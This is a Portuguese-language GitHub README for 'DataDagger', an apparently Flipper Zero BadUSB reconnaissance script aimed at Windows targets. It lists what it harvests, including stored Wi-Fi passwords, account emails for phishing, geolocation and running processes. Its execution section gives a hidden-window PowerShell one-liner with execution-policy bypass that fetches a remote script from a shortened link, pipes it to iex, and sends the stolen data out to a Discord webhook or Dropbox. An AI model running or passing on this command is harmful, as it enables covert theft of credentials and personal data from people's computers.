![Logo](https://raw.githubusercontent.com/ClankPT/Flipper-Zero-BadUSB/main/Imagem/mini%20mini%20TH.png)

<!-- TABLE OF CONTENTS -->
<details>
  <summary>Table of Contents</summary>
  <ol>
    <li><a href="#Descrição">Descrição</a></li>
    <li><a href="#Vamos Começar">Vamos Começar</a></li>
    <li><a href="#Compatibilidade">Compatibilidade</a></li>
    <li><a href="#Histórico de Versões">Histórico de Versões</a></li>
    <li><a href="#Contacto">Contacto</a></li>
    <li><a href="#Conhecimentos">Conhecimentos</a></li>
  </ol>
</details>

# DataDagger

Script de reconhecimento avançado a um computador alvo, capaz de mostrar muita informação sensível

## Descrição

Este programa foi desenvolvido para coletar o máximo de dados possível para fins de reconhecimento. Isso inclui

* Hosts versão do PowerShell (para saber quais comandos podem ser executados)
* Nome associado à conta da Microsoft
* Estejam eles no grupo Admin ou não
* O e-mail associado à conta da Microsoft (para possibilidades de phishing)
* A geolocalização (saber localização aproximada)
* Redes Wifi próximas (possível movimento lateral)
* Informações de rede (endereço IP local e público; endereço MAC; RDP ativado?)
* Perfis WLAN (lista de SSIDs e passwords armazenadas no PC)
* Interfaces de rede (com o que elas estão ligadas)
* Informações do sistema (fabricante, modelo, número de série, sistema operacional, CPU, RAM, BIOS da placa-mãe)
* Utilizadores locais (contas no sistema com nome de usuário, nome associado à conta microsoft e SID)
* Informações sobre os discos rígidos 
* Dispositivos COM e seriais ( dispositivo ligados ou emparelhados com o PC)
* Conexões TCP ativas (varredura de porta)
* Processos, serviços, software e drivers (o que está a ser executado no computador e  que podemos explorar? processos ativos/parados)
* Informações sobre as especifições sobre o PC
* Lista de programas do PC
* Tree (exploração de toda a tree do PC)
## Vamos Começar

### Compatibilidade

* Dropbox ou Discord
* Windows 10,11

<p align="right">(<a href="#top">voltar</a>)</p>

### Execução
* Conectar ao dispositivo
* Esperar alguns segundos e verificar o Discord

`$dc` é a variável que guarda no webhook do discord 

`$db` é a variável que guarda na dropbox 

Um destes deve ser prenchido para os dados serem recolhidos
```
powershell -w h -NoP -Ep Bypass $dc='';$db='';irm bit.ly/ClankPT | iex
```

<p align="right">(<a href="#top">voltar</a>)</p>

## Contribuição

* Clank

* Luís Lopes

* Tiago Casal

<p align="right">(<a href="#top">voltar</a>)</p>

## Histórico de Versões

* 0.1
    * Ainda em desenvolvimento ...

<p align="right">(<a href="#top">voltar</a>)</p>

<!-- CONTACT -->
## Contacto

<h2 align="center">📱 My Socials 📱</h2>
<div align=center>
<table>
  <tr>
    <td align="center" width="96">
      <a href="https://discord.gg/4BURDrRMBZ">
        <img src=https://github.com/I-Am-Jakoby/I-Am-Jakoby/blob/main/img/discord-v2-svgrepo-com.svg width="48" height="48" alt="Jsonnet" />
      </a>
      <br>Discord
    </td>
  </tr>
</table>
</div>



<p align="right">(<a href="#top">voltar</a>)</p>

<!-- ACKNOWLEDGMENTS -->
## Conhecimentos

* [Hak5](https://hak5.org/)
* [MG](https://github.com/OMG-MG)

<p align="right">(<a href="#top">voltar</a>)</p>
